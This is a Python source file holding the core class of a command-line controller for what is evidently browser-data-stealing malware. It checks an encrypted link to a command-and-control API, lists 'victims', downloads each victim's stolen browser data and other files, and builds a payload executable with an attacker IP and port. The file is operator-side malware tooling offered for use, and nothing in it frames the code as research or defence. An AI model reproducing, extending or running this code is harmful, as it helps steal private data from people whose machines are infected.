"""CLI core class"""
from models.CryptoCore import CryptoCore
import requests
import json
import re
from sys import platform
import os
import subprocess


class Core(CryptoCore):
    """Core class for CLI"""
    IsReady = False
    ApiUrl = None

    def GetUserInput(self, PromptText: str, ErrorText: str, InputLength: int, ExpectedInput: list, AllLower: bool) -> str:
        """
        Get user input as required.

        args:
            @PromptText (str): the text that will be printed before user can input.
            @ErrorText (str): the text that will be printed if the input didnt match what required.
            @InputLength (int): the length of the required input.
            @ExpectedInput (List[]): excepted inputs.
            @AllLower (bool): if the input should be converted to lowercase before validating.

        return:
            str: the required input.
        """
        InputData = ""
        while True:
            InputData = input(PromptText)

            if AllLower is True:
                InputData = InputData.lower()
            if InputLength != 0:
                if len(InputData) == InputLength:
                    break
                print(f"{ErrorText} {len(InputData)}.")
            elif ExpectedInput is not None:
                if InputData in ExpectedInput:
                    break
                print(ErrorText)
            else:
                break

        return InputData

    def CryptoParam(self, params: dict) -> None:
        """
        Set or generate random cryptographic parameters.

        args:
            @params (dict): a dictionary that has 2 keys "key" and "IV" or None.

        return:
            None.
        """
        if params is None:
            self.CryptographicParam(None, None)
        else:
            self.CryptographicParam(params["key"], params["IV"])

    def IsValidIpv4(self, ip: str) -> bool:
        """
        Check if ip is valid or not.
        args:
            @ip (str): ip address.

        return:
            (bool); True if its valid, flase if not.
        """
        if re.match(pattern=r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$", string=ip):
            return True
        else:
            return False

    def IsValidPort(self, port: str) -> bool:
        """
        Check if port is valid or not.
        args:
            @port (str): port.

        return:
            (bool); True if its valid, flase if not.
        """
        try:
            port = int(port)
            if port > 65535:
                raise ValueError
            return True
        except ValueError:
            return False

    def check(self):
        """Check if the api is reachable and validate the cryptographic parameters."""
        if self.ApiUrl is None:
            print("[-] The api URL is missing, You should set it before checking the api.")
            return
        if self.CheckParam() is True:
            TestMessage = self.EncryptBuffer("Are you ready?")
            header = {"cc": TestMessage}
            url = self.ApiUrl + "/check"
            try:
                response = requests.get(url=url, headers=header, timeout=5)

                if response.status_code == 200:
                    self.IsReady = True
                    print("[+] All good.")
                else:
                    print("[-] Incorrect cryptographic parameters. You should verify that the used parameters are the same ones on the api.")
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                print("[-] The api is not responding, You should verify that the api URL is correct.")
                self.IsReady = False
        else:
            print("[-] The cryptographic parameters are missing, You should set them or load a setting file before checking the api.")
            self.IsReady = False

    def GetVictims(self) -> dict:
        if self.IsReady is True:
            url = self.ApiUrl + "/GetAll"

            try:
                response = requests.get(url=url)
                data = self.DecryptBuffer(response.text).decode("utf-8")
                return json.loads(data)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                print("[-] The api is down.")

        return None

    def GetVictimBrowsersData(self, VictimIP):
        if self.IsReady is True:
            url = self.ApiUrl + "/GetVictimData"
            ip = self.EncryptBuffer(VictimIP)
            header = {"TARGET": ip}

            try:
                response = requests.get(url=url, headers=header, stream=True)
                data = ""
                if response.status_code == 200:
                    for chunk in response.iter_content(chunk_size=102400):
                        if chunk:
                            data += chunk.decode("utf-8")
                    data = self.DecryptBuffer(data).decode("utf-8")
                    return json.loads(data)
                elif response.status_code == 204:
                    print("[-] The victim does not exists.")
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                print("[-] The api is down.")

        return None

    def GetVictimData(self, VictimIP):
        if self.IsReady is True:
            url = self.ApiUrl + "/down"
            ip = self.EncryptBuffer(VictimIP)
            header = {"TARGET": ip}

            try:
                response = requests.get(url=url, headers=header, stream=True)
                data = ""
                if response.status_code == 200:
                    for chunk in response.iter_content(chunk_size=102400):
                        if chunk:
                            data += chunk.decode("utf-8")
                    return self.DecryptBuffer(data)
                elif response.status_code == 204:
                    print("[-] The victim does not exists.")
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                print("[-] The api is down.")

        return None

    def BuildExe(self, ip, port):
        os.chdir("./payload")
        command = []
        if platform == "win32":
            command.append("build.bat")
            command.append(ip)
            command.append(port)
        else:
            command.append("make")

        subprocess.run(command)

        os.chdir("..")
